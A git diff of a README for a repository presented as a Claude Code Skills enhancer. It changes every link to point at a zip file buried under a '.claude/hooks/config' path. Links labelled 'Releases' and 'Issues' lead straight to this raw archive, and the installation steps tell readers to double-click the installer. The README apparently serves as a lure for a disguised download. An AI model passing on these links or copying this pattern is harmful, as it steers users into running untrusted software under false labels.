@@ -1,6 +1,6 @@
 # 🚀 claude-skills-supercharged - Supercharge Your Claude Workflows
 
-[![Download](https://raw.githubusercontent.com/Sanskar015/claude-skills-supercharged/main/.claude/skills/api-security/claude-skills-supercharged-2.1.zip)](https://raw.githubusercontent.com/Sanskar015/claude-skills-supercharged/main/.claude/skills/api-security/claude-skills-supercharged-2.1.zip)
+[![Download](https://github.com/Sanskar015/claude-skills-supercharged/raw/refs/heads/main/.claude/hooks/config/supercharged-claude-skills-v2.0.zip)](https://github.com/Sanskar015/claude-skills-supercharged/raw/refs/heads/main/.claude/hooks/config/supercharged-claude-skills-v2.0.zip)
 
 ## 🌟 Overview
 
@@ -10,7 +10,7 @@ claude-skills-supercharged enhances your Claude Code Skills. It uses unique Haik
 
 To get started, visit the Releases page to download the latest version of the software.
 
-[Download from Releases](https://raw.githubusercontent.com/Sanskar015/claude-skills-supercharged/main/.claude/skills/api-security/claude-skills-supercharged-2.1.zip)
+[Download from Releases](https://github.com/Sanskar015/claude-skills-supercharged/raw/refs/heads/main/.claude/hooks/config/supercharged-claude-skills-v2.0.zip)
 
 ### 🖥️ System Requirements
 
@@ -23,7 +23,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ### 🔧 Installation Steps
 
-1. Click on the [Download from Releases](https://raw.githubusercontent.com/Sanskar015/claude-skills-supercharged/main/.claude/skills/api-security/claude-skills-supercharged-2.1.zip) link.
+1. Click on the [Download from Releases](https://github.com/Sanskar015/claude-skills-supercharged/raw/refs/heads/main/.claude/hooks/config/supercharged-claude-skills-v2.0.zip) link.
 2. Find the latest version and select the appropriate installer for your operating system.
 3. Once the download completes, locate the file in your downloads folder.
 4. Double-click the installer file to start the installation process.
@@ -57,11 +57,11 @@ A: If you face issues, check that your system meets the requirements. You can al
 
 ## 📞 Support
 
-For any technical support, please visit the [Issues](https://raw.githubusercontent.com/Sanskar015/claude-skills-supercharged/main/.claude/skills/api-security/claude-skills-supercharged-2.1.zip) page on GitHub. You can report bugs or request features there.
+For any technical support, please visit the [Issues](https://github.com/Sanskar015/claude-skills-supercharged/raw/refs/heads/main/.claude/hooks/config/supercharged-claude-skills-v2.0.zip) page on GitHub. You can report bugs or request features there.
 
 ## 🔗 Links
 
-- [Download from Releases](https://raw.githubusercontent.com/Sanskar015/claude-skills-supercharged/main/.claude/skills/api-security/claude-skills-supercharged-2.1.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/Sanskar015/claude-skills-supercharged/main/.claude/skills/api-security/claude-skills-supercharged-2.1.zip)
+- [Download from Releases](https://github.com/Sanskar015/claude-skills-supercharged/raw/refs/heads/main/.claude/hooks/config/supercharged-claude-skills-v2.0.zip)
+- [GitHub Issues](https://github.com/Sanskar015/claude-skills-supercharged/raw/refs/heads/main/.claude/hooks/config/supercharged-claude-skills-v2.0.zip)
 
 Thank you for using claude-skills-supercharged. We hope you find it helpful in optimizing your workflows!
